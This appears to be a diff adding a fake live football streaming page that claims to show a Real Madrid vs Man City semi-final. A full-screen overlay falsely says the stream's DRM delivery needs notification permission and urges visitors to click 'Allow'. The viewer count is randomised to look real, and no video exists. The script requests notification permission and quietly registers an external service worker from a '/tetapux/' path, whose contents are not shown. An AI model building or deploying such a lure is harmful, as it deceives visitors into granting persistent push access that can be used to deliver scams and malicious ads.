@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Sport Stream — HD</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: "Inter", -apple-system, "Segoe UI", sans-serif;
+      background: #0a0a0a;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .player-wrap {
+      width: 90%;
+      max-width: 760px;
+    }
+    .player {
+      width: 100%;
+      aspect-ratio: 16/9;
+      background: #111;
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .player-bg {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, #0d2818 0%, #060a06 40%, #0a0a12 100%);
+    }
+    .noise-overlay {
+      position: absolute;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4'%3E%3Crect width='1' height='1' fill='rgba(255,255,255,0.015)'/%3E%3C/svg%3E");
+      pointer-events: none;
+    }
+    .live-badge {
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      background: #e63946;
+      padding: 5px 12px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 5;
+    }
+    .live-badge::before {
+      content: "";
+      width: 6px;
+      height: 6px;
+      background: #fff;
+      border-radius: 50%;
+      animation: livePulse 1.5s infinite;
+    }
+    @keyframes livePulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .viewer-count {
+      position: absolute;
+      top: 14px;
+      right: 14px;
+      background: rgba(0,0,0,0.65);
+      backdrop-filter: blur(4px);
+      padding: 5px 12px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 500;
+      z-index: 5;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .controls {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(transparent, rgba(0,0,0,0.85));
+      padding: 24px 16px 14px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      z-index: 5;
+    }
+    .ctrl-btn {
+      background: none;
+      border: none;
+      color: rgba(255,255,255,0.8);
+      font-size: 16px;
+      cursor: pointer;
+      padding: 4px;
+      transition: color 0.15s;
+    }
+    .ctrl-btn:hover { color: #fff; }
+    .progress-bar {
+      flex: 1;
+      height: 4px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 2px;
+      overflow: hidden;
+      cursor: pointer;
+    }
+    .progress-fill {
+      height: 100%;
+      background: #e63946;
+      width: 0%;
+      border-radius: 2px;
+      animation: liveProgress 4s ease-out forwards;
+    }
+    @keyframes liveProgress { to { width: 1.5%; } }
+    .time-label { font-size: 12px; color: rgba(255,255,255,0.6); font-weight: 500; }
+    .notification-gate {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.88);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+      border-radius: 12px;
+    }
+    .gate-card {
+      text-align: center;
+      max-width: 340px;
+      padding: 20px;
+    }
+    .gate-card .play-icon {
+      width: 64px;
+      height: 64px;
+      background: rgba(230,57,70,0.12);
+      border: 2px solid rgba(230,57,70,0.25);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      font-size: 24px;
+    }
+    .gate-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+    .gate-card p { font-size: 13px; color: #8b8b9e; line-height: 1.5; margin-bottom: 18px; }
+    .gate-hint {
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 13px;
+      color: #bbb;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+    .gate-hint b { color: #fff; }
+    .gate-btn {
+      width: 100%;
+      padding: 14px;
+      background: #e63946;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .gate-btn:hover { background: #c1121f; }
+    .match-info {
+      margin-top: 18px;
+      width: 90%;
+      max-width: 760px;
+    }
+    .match-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .match-header h2 { font-size: 17px; font-weight: 600; }
+    .match-header .quality {
+      font-size: 11px;
+      font-weight: 700;
+      background: rgba(230,57,70,0.12);
+      color: #e63946;
+      padding: 4px 10px;
+      border-radius: 4px;
+      letter-spacing: 0.5px;
+    }
+    .match-sub { font-size: 13px; color: #666; margin-top: 4px; }
+    .match-teams {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      margin-top: 16px;
+      padding: 16px;
+      background: #141418;
+      border-radius: 10px;
+      border: 1px solid #222;
+    }
+    .team {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .team-crest {
+      width: 36px;
+      height: 36px;
+      background: #222;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+    }
+    .team-name { font-size: 15px; font-weight: 600; }
+    .score-display {
+      font-size: 28px;
+      font-weight: 800;
+      letter-spacing: 4px;
+      color: #e63946;
+      text-align: center;
+      min-width: 80px;
+    }
+    .score-time {
+      font-size: 11px;
+      color: #666;
+      text-align: center;
+      font-weight: 500;
+      letter-spacing: 0;
+      margin-top: 2px;
+    }
+    @media (max-width: 500px) { .match-teams { flex-direction: column; gap: 10px; } .score-display { font-size: 22px; } }
+  </style>
+</head>
+<body>
+  <div class="player-wrap">
+    <div class="player">
+      <div class="player-bg"></div>
+      <div class="noise-overlay"></div>
+      <div class="live-badge">LIVE</div>
+      <div class="viewer-count">👁 <span id="viewers">42,891</span></div>
+      <div class="controls">
+        <button class="ctrl-btn">▶</button>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <span class="time-label">LIVE</span>
+        <button class="ctrl-btn">🔊</button>
+        <button class="ctrl-btn">⛶</button>
+      </div>
+      <div class="notification-gate" id="gate">
+        <div class="gate-card">
+          <div class="play-icon">▶</div>
+          <h3>Enable stream notifications</h3>
+          <p>This live stream uses DRM-protected content delivery that requires notification permissions for buffer management.</p>
+          <div class="gate-hint">Click <b>"Allow"</b> in the browser prompt that appears to begin watching in HD quality.</div>
+          <button class="gate-btn" onclick="requestNotif()">Enable & Start Watching</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="match-info">
+    <div class="match-header">
+      <div>
+        <h2>Champions League — Semi-Final</h2>
+        <div class="match-sub">Santiago Bernabéu · Started 34 min ago</div>
+      </div>
+      <span class="quality">1080p HD</span>
+    </div>
+    <div class="match-teams">
+      <div class="team">
+        <div class="team-crest">⚽</div>
+        <div class="team-name">Real Madrid</div>
+      </div>
+      <div>
+        <div class="score-display">1 — 0</div>
+        <div class="score-time">34'</div>
+      </div>
+      <div class="team" style="justify-content: flex-end;">
+        <div class="team-name">Man City</div>
+        <div class="team-crest">⚽</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    setInterval(() => {
+      const v = 42000 + Math.floor(Math.random() * 2000);
+      document.getElementById('viewers').textContent = v.toLocaleString();
+    }, 5000);
+
+    function requestNotif() {
+      if ('Notification' in window) {
+        Notification.requestPermission().then(p => {
+          if (p === 'granted') document.getElementById('gate').style.display = 'none';
+        });
+      }
+      if ('serviceWorker' in navigator) navigator.serviceWorker.register('/tetapux/sw.js').catch(() => {});
+    }
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
